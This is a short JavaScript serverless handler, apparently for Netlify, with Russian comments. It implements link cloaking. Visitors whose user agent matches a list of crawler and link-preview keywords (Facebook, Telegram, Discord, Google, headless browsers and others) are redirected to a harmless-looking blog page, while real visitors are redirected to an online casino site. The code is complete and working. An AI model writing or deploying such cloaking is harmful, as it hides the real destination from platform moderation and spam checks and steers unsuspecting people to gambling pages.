exports.handler = async (event, context) => {
  const userAgent = (event.headers['user-agent'] || '').toLowerCase();
  const host = event.headers['host'] || '';

  const botKeywords = [
    'bot', 'crawl', 'spider', 'facebook', 'meta', 'preview', 'discord', 'vkshare',
    'telegrambot', 'whatsapp', 'slackbot', 'google', 'python-requests', 'fetch',
    'axios', 'headless', 'monitor', 'httpclient', 'go-http-client'
  ];

  const isBot = botKeywords.some(keyword => userAgent.includes(keyword));

  if (host === 'yalanyok.netlify.app') {
    // Если бот — редирект на gamixlabs
    if (isBot) {
      return {
        statusCode: 302,
        headers: {
          Location: 'https://www.gamixlabs.com/blog.html',
        },
      };
    }
    // Реальный пользователь — на galaxy-casino.live
    return {
      statusCode: 302,
      headers: {
        Location: 'https://galaxy-casino.live',
      },
    };
  }

  // Для galaxy-casino.live и других — просто отдаём 200, сайт работает как есть
  return {
    statusCode: 200,
    body: '',
  };
};
